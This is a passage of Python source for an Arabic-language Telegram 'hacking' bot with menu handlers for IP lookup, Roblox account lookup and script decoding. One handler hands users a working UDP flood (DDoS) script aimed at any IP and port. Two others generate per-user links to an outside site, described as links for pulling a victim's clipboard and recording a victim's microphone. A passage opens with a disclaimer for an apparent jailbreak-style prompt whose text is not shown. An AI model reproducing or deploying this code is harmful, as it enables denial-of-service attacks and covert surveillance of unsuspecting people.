أنا أخلّي مسؤوليتي عن أي استخدام خاطئ لهذا البرومبت. استخدام هذا البرومبت يكون تحت مسؤوليتك الشخصية الكاملة.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def button(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == 'website_files':
        await query.edit_message_text("الرجاء إرسال رابط الموقع الذي تريد الحصول على ملف HTML الخاص به. 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    elif query.data == 'ip_info':
        await query.edit_message_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    elif query.data == 'temp_email':
        await generate_temp_email_1secmail(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'view_messages':
        await view_email_messages(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data.startswith('read_message_'):
        await read_email_message(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'hacking_tools':
        hacking_tools_text = """
• أدوات اختراق الشبكات والأنظمة:

1. Nmap
لفحص الشبكات واكتشاف الأجهزة والخدمات المفتوحة.

2. Wireshark
لتحليل حزم الشبكة ورصد البيانات المرسلة والمستقبلة.

3. Metasploit Framework
منصة لاختبار الثغرات وتنفيذ هجمات تحكم عن بُعد.

4. Aircrack-ng
لاختبار اختراق شبكات الواي فاي (Wi-Fi).

5. Burp Suite
أداة لاختبار أمان تطبيقات الويب واكتشاف ثغرات مثل XSS وSQL Injection.

6. John the Ripper
برنامج لكسر كلمات المرور (Password Cracking).

7. Hydra
أداة اختبار قوة كلمات المرور (Brute Force).

8. Nikto
ماسح ثغرات ويب (Web Vulnerability Scanner).

9. SQLmap
لاكتشاف واستغلال ثغرات SQL Injection في قواعد البيانات.

10. Hashcat
برنامج قوي لكسر كلمات المرور المشفرة.


---

أدوات نظام لينكس الشائعة في مجال الأمن:

Kali Linux
توزيعة لينكس مخصصة للاختراق الأخلاقي تحتوي على معظم الأدوات السابقة.

Parrot Security OS
توزيعة بديلة مع أدوات مشابهة
"""
        await query.edit_message_text(hacking_tools_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'search_user':
        await query.edit_message_text("الرجاء إرسال معرف حساب شخص في تليجرام للانتقال إلى حسابه. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    elif query.data == 'clipboard_pull':
        user_id = query.from_user.id
        clipboard_link = f"✅- تم إنشاء رابط سحب الحافظة \nhttps://max.powerv1.site/pag/cop.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(clipboard_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'victim_sound':
        user_id = query.from_user.id
        victim_sound_link = f"✅- تم إنشاء رابط تسجيل صوت اضحيه\nhttps://max.powerv1.site/pag/mic.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(victim_sound_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'how_to_be_hacker':
        how_to_hacker_text = """
• 1. ابدأ بتعلّم أساسيات الكمبيوتر: كيف يعمل الجهاز، الملفات، الرام، المعالج.

2. اتقن الشبكات: مثل IP, DNS, البروتوكولات (TCP/IP).

3. استخدم نظام Linux: هو النظام الأساسي للهاكرز المحترفين.

4. تعلم البرمجة: أهم لغات الاختراق: Python، Bash، C، JavaScript.

5. تعرّف على أنواع أنظمة التشغيل: Windows، Linux، Android.

6. استخدم أدوات اختبار الاختراق مثل:

Nmap (للبحث عن الأجهزة).

Wireshark (لمراقبة الشبكة).

Metasploit (لتجربة الثغرات).

7. افهم الثغرات الأمنية: SQL Injection، XSS، Brute Force.

8. مارس عبر منصات تدريب:

HackTheBox

TryHackMe

9. تعلّم الهندسة الاجتماعية: فن خداع الناس لجمع معلومات.

10. تدرّب على اختراق قانوني (CTF) لتطوير مهاراتك.

11. اقرأ كتب وأدلة تعليمية متخصصة.

12. تابع دورات على يوتيوب ومواقع مجانية.

13. احصل على شهادات دولية مثل CEH أو OSCP.

14. ابقَ مطّلعًا على أحدث الثغرات والهجمات.

15. كن أخلاقيًا ولا تخرق القانون.

16. سجّل في مجتمعات هاكرز أخلاقيين لتتعلّم منهم.

17. استخدم مهاراتك في حماية الأنظمة وليس تخريبها.

18. ابدأ صغيرًا، وتمرّن يوميًا، ولا تستعجل الاحتراف
"""
        await query.edit_message_text(how_to_hacker_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'decrypt_roblox':
        await query.edit_message_text("الرجاء إرسال ملف يحتوي على سكربت روبلوكس مشفر (base64 أو تشفير ضعيف) لفك تشفيره. 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECRYPT_ROBLOX_SCRIPT

    elif query.data == 'roblox_account_info':
        await query.edit_message_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس للحصول على معلوماته. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    elif query.data == 'decorate_text':
        await query.edit_message_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    elif query.data == 'joke':
        await generate_joke(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'ddos_tool':
        ddos_code = """
import socket
import threading
import random
import time
import sys

target_ip = input("IP: ")
target_port = int(input("Port: "))
threads = int(input("Threads: "))

def flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

for _ in range(threads):
    threading.Thread(target=flood).start()
"""
        await query.edit_message_text(f"```python\n{ddos_code}\n```", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'ddos_explain':
        await ddos_explain(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'deepseek_prompt':
        await deepseek_prompt(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'check_link':
        await query.edit_message_text("الرجاء إرسال الرابط الذي تريد فحصه. 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    elif query.data == 'generate_password':
        await generate_strong_password(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'instructions':
        instructions_text = """
📜 شروط الاستخدام:

أتعهد أنا المستخدم للتطبيق بأنني:

✅ لن أستخدم التطبيق فيما يغضب الله تعالى.
✅ لن أسرق صور أو حسابات بغرض السرقة أو التجسس على الرسائل.
✅ سأستخدم التطبيق فقط لغرض:

المزاح اللطيف.

الربح المشروع.

التجربة الشخصية.

الدعاية والإعلانات المسموح بها.

⚠️ أُبرئ ذمة مالك ومسؤول التطبيق من أي استخدام خاطئ أو مخالف يؤدي إلى معصية أو ضرر بالآخرين.

✨ الرجاء استخدام التطبيق بما يرضي الله ويحفظ حقوق الجميع
"""
        await query.edit_message_text(instructions_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'analyze_phone':
        return await analyze_phone_number(update, context)
    
    elif query.data == 'analyze_email':
        return await analyze_email(update, context)

    return CHOOSING_MAIN_MENU

async def get_website_html(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        file_name = f"website_{re.sub(r'[\W_]+', '_', url)}.html"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(str(soup.prettify()))
        await update.message.reply_document(document=open(file_name, 'rb'), filename=file_name, caption="تم استخراج ملف HTML للموقع بنجاح. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب محتوى الموقع: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_ip_info(update: Update, context) -> int:
    query_text = update.message.text
    if not query_text:
        await update.message.reply_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    try:
        ip_address = None
        domain_name = None

        if re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", query_text):
            ip_address = query_text
            domain_name = "غير متوفر"
        else:
            try:
                ip_address = socket.gethostbyname(query_text)
                domain_name = query_text
            except socket.gaierror:
                await update.message.reply_text("تعذر حل اسم النطاق أو عنوان IP غير صالح. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
                return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain_name}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء الاتصال بخدمة معلومات IP: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def search_telegram_user(update: Update, context) -> int:
    user_id_or_username = update.message.text
    if not user_id_or_username:
        await update.message.reply_text("الرجاء إرسال معرف حساب شخص في تليجرام أو اسم المستخدم. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    try:
        if user_id_or_username.isdigit():
            user_link = f"tg://user?id={user_id_or_username}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        elif user_id_or_username.startswith('@'):
            user_link = f"https://t.me/{user_id_or_username[1:]}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text("الرجاء إدخال معرف حساب تليجرام صحيح (رقم) أو اسم مستخدم يبدأ بـ @. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def generate_joke(update: Update, context) -> None:
    jokes = [
        "ما هو الشيء الذي يمشي ويقف وليس له أرجل؟ الساعة. 😂",
        "لماذا يضع الفيل طلاء أظافر أحمر؟ ليختبئ في شجرة الفراولة. 🐘💅",
        "ما هو أذكى حيوان؟ الزرافة، لأن رأسها في السحاب. 🦒🧠",
        "ماذا قال الجبل للجبل؟ لم نلتقِ منذ زمن طويل. ⛰️⛰️",
        "لماذا سميت حاسة الشم بهذا الاسم؟ لأنها تشم. 👃",
        "ما هو وجه الشبه بين الكمبيوتر والحفرة؟ كلاهما يحتاج إلى حفر. 💻🕳️",
        "ما هو الشيء الذي كلما أخذت منه كبر؟ الحفرة. 🕳️",
        "ما هو الشيء الذي يرتفع ولا ينزل؟ العمر. 📈",
        "ما هو الشيء الذي له عين واحدة ولا يرى؟ الإبرة. 👁️🧵",
        "ما هو الشيء الذي له أسنان ولا يعض؟ المشط. 🦷"
    ]
    joke = random.choice(jokes)
    await update.callback_query.edit_message_text(f"{joke}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("نكته أخرى 😂", callback_data='joke')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def generate_strong_password(update: Update, context) -> None:
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(16))
    await update.callback_query.edit_message_text(f"🔑 كلمة مرور قوية جديدة:\n{password}", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("توليد كلمة مرور أخرى 🔑", callback_data='generate_password')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def check_link(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    try:
        domain = re.findall(r'https?://(?:www\.)?([^/]+)\b', url)[0]

        ip_address = None
        try:
            ip_address = socket.gethostbyname(domain)
        except socket.gaierror:
            await update.message.reply_text("تعذر حل اسم النطاق من الرابط. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP للرابط: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء فحص الرابط: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_roblox_account_info(update: Update, context) -> int:
    username = update.message.text
    if not username:
        await update.message.reply_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    try:
        user_id_response = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": True}
        )
        user_id_response.raise_for_status()
        user_data = user_id_response.json()

        if not user_data or not user_data.get('data'):
            await update.message.reply_text("لم يتم العثور على المستخدم بهذا الاسم. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        user_id = user_data['data'][0]['id']
        display_name = user_data['data'][0]['displayName']

        user_details_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        user_details_response.raise_for_status()
        details = user_details_response.json()

        friends_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count")
        friends_count_response.raise_for_status()
        friends_count = friends_count_response.json().get('count', 'غير متوفر')

        followers_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count")
        followers_count_response.raise_for_status()
        followers_count = followers_count_response.json().get('count', 'غير متوفر')

        created_date_str = details.get('created', 'غير متوفر')
        account_age = "غير متوفر"
        if created_date_str != 'غير متوفر':
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            age_delta = datetime.now(created_date.tzinfo) - created_date
            years = age_delta.days // 365
            months = (age_delta.days % 365) // 30
            account_age = f"{years} سنة و {months} شهر"

        info_text = f"معلومات حساب روبلوكس:\n\n"
        info_text += f"👤 اسم المستخدم: {username}\n"
        info_text += f"🆔 معرف الحساب: {user_id}\n"
        info_text += f"✨ الاسم المعروض: {display_name}\n"
        info_text += f"🗓️ تاريخ الإنشاء: {created_date_str.split('T')[0] if created_date_str != 'غير متوفر' else 'غير متوفر'}\n"
        info_text += f"👴 عمر الحساب: {account_age}\n"
        info_text += f"👫 عدد الأصدقاء: {friends_count}\n"
        info_text += f"💖 عدد المتابعين: {followers_count}\n"

        await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب معلومات حساب روبلوكس: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decorate_text(update: Update, context) -> int:
    text_to_decorate = update.message.text
    if not text_to_decorate:
        await update.message.reply_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    decorated_options = [
        f"«{text_to_decorate}»", f"『{text_to_decorate}』", f"【{text_to_decorate}】",
        f"⦅{text_to_decorate}⦆", f"〘{text_to_decorate}〙", f"〚{text_to_decorate}〛",
        f"❨{text_to_decorate}❩", f"❪{text_to_decorate}❫", f"❬{text_to_decorate}❭",
        f"❰{text_to_decorate}❱", f"❲{text_to_decorate}❳", f"❴{text_to_decorate}❵",
        f"⟅{text_to_decorate}⟆", f"⟪{text_to_decorate}⟫", f"⟬{text_to_decorate}⟭",
        f"⟮{text_to_decorate}⟯", f"⦃{text_to_decorate}⦄", f"⦅{text_to_decorate}⦆",
        f"⦗{text_to_decorate}⦘", f"⦘{text_to_decorate}⦗", f"⦙{text_to_decorate}⦙",
        f"⦚{text_to_decorate}⦚", f"⦛{text_to_decorate}⦜", f"⦝{text_to_decorate}⦞",
        f"⦟{text_to_decorate}⦠", f"⦡{text_to_decorate}⦢", f"⦣{text_to_decorate}⦤",
        f"⦥{text_to_decorate}⦦", f"⦧{text_to_decorate}⦨", f"⦩{text_to_decorate}⦪"
    ]

    response_text = "اختر الزخرفة المفضلة لديك:\n\n"
    for i, option in enumerate(decorated_options):
        response_text += f"{i+1}. {option}\n"

    await update.message.reply_text(response_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decrypt_roblox_script(update: Update, context) -> int:
    if update.message.document:
        file_id = update.message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = f"./{update.message.document.file_name}"
        await new_file.download_to_drive(file_path)

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                encrypted_content = f.read()

            try:
                decoded_content = base64.b64decode(encrypted_content).decode('utf-8')
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + decoded_content
            except Exception:
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + "لم يتم التعرف على التشفير أو فكه. قد يكون التشفير أقوى من المتوقع أو غير مدعوم حالياً.\n" + encrypted_content

            output_file_name = f"decrypted_{update.message.document.file_name}"
            with open(output_file_name, "w", encoding="utf-8") as f:
                f.write(decrypted_text)

            await update.message.reply_document(document=open(output_file_name, 'rb'), filename=output_file_name, caption="تم فك تشفير السكربت بنجاح (إذا كان التشفير مدعوماً). 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    else:
        await update.message.reply_text("الرجاء إرسال ملف السكربت المشفر. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def cancel(update: Update, context) -> int:
    await update.message.reply_text(
        "تم إلغاء العملية. يمكنك البدء من جديد باستخدام /start.", reply_markup=main_menu_reply_markup
    )
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING_MAIN_MENU: [
                CallbackQueryHandler(button, pattern='^(?!main_menu$).*'),
                CallbackQueryHandler(main_menu, pattern='^main_menu$')
            ],
            GETTING_WEBSITE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_website_html)],
            GETTING_IP_INFO_QUERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip_info)],
            GETTING_TELEGRAM_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, search_telegram_user)],
            GETTING_ROBLOX_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_roblox_account_info)],
            GETTING_DECORATE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, decorate_text)],
            GETTING_DECRYPT_ROBLOX_SCRIPT: [MessageHandler(filters.Document.ALL, decrypt_roblox_script)],
            GETTING_CHECK_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
            GETTING_PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_analysis)],
            GETTING_EMAIL_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email_analysis)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(main_menu, pattern='^main_menu$')],
        per_message=False
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
